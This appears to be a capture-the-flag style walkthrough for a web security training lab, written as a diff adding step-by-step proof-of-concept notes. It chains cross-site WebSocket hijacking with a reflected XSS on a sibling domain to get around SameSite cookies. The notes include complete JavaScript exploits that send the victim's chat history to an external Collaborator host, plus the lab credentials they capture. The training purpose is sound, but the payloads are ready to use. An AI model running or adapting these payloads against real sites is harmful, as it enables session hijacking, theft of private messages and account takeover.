@@ -1,0 +1,118 @@
+CSWSH via SameSite Bypass Using Vulnerable Sibling Domain – PoC Steps
+Lab Goal
+
+Exploit a Cross-Site WebSocket Hijacking (CSWSH) vulnerability to steal victim chat history and obtain victim credentials.
+
+Step 1 — Open Live Chat
+Login to the lab.
+Open the Live Chat feature.
+Send a few random messages.
+Step 2 — Identify WebSocket Connection
+Open Burp Suite.
+Go to:
+Proxy → HTTP history
+Find the WebSocket handshake request:
+GET /chat HTTP/2
+Observe:
+No CSRF token exists.
+Authentication relies on session cookies.
+Step 3 — Observe Chat History Behavior
+Refresh the live chat page.
+Go to:
+Proxy → WebSockets history
+Observe browser sends:
+READY
+Server responds with entire chat history.
+
+This confirms potential CSWSH vulnerability.
+
+Step 4 — Create Initial CSWSH PoC
+Open Burp Collaborator.
+Click:
+Copy to clipboard
+Copy generated collaborator payload.
+
+Example:
+
+v6278upwkz1gtgxqkqzk9b66vx1opndc.oastify.com
+Step 5 — Create Initial Exploit
+Open Exploit Server.
+Paste:
+<script>
+var ws = new WebSocket('wss://0a80000004490703804971a1007700d8.web-security-academy.net/chat');
+
+ws.onopen = function() {
+    ws.send("READY");
+};
+
+ws.onmessage = function(event) {
+    fetch('https://v6278upwkz1gtgxqkqzk9b66vx1opndc.oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: event.data
+    });
+};
+</script>
+Click Store.
+Click View exploit.
+Step 6 — Poll Collaborator
+Go back to Burp Collaborator.
+Click:
+Poll now
+Observe:
+DNS interactions
+HTTP interactions
+
+But no victim chat history yet because:
+
+Session cookie uses SameSite=Strict.
+Step 7 — Identify Vulnerable Sibling Domain
+In Burp HTTP history inspect static file responses.
+Observe:
+Access-Control-Allow-Origin: https://cms-0a80000004490703804971a1007700d8.web-security-academy.net
+Open:
+https://cms-0a80000004490703804971a1007700d8.web-security-academy.net
+Step 8 — Find Reflected XSS
+Submit invalid login credentials.
+Observe username reflected in response.
+Test XSS:
+<script>alert(1)</script>
+Confirm alert executes.
+Step 9 — Convert Login Request to GET
+Send login request to Burp Repeater.
+Right-click request.
+Select:
+Change request method
+Convert POST → GET.
+Confirm XSS still works in browser.
+Step 10 — Final Working Exploit
+
+Paste this payload into Exploit Server:
+
+<script>
+document.location='https://cms-0a80000004490703804971a1007700d8.web-security-academy.net/login?username=%3Cimg%20src=1%20onerror=%22var%20ws=new%20WebSocket(%60wss://0a80000004490703804971a1007700d8.web-security-academy.net/chat%60);ws.onopen=function(){ws.send(%60READY%60)};ws.onmessage=function(e){navigator.sendBeacon(%60https://v6278upwkz1gtgxqkqzk9b66vx1opndc.oastify.com%60,e.data)}%22%3E&password=test';
+</script>
+Step 11 — Execute Exploit
+Click Store
+Click View exploit
+Wait 10 seconds
+Step 12 — Retrieve Victim Credentials
+Go to Burp Collaborator.
+Click:
+Poll now
+Open HTTP interactions.
+Observe leaked chat messages.
+
+Example:
+
+{"user":"Hal Pline","content":"No problem carlos, it&apos;s 109hqarsklz6s1x3yk3p"}
+
+Victim credentials:
+
+Username: carlos
+Password: 109hqarsklz6s1x3yk3p
+Step 13 — Login as Victim
+Open main lab site.
+Login using:
+Username: carlos
+Password: 109hqarsklz6s1x3yk3p
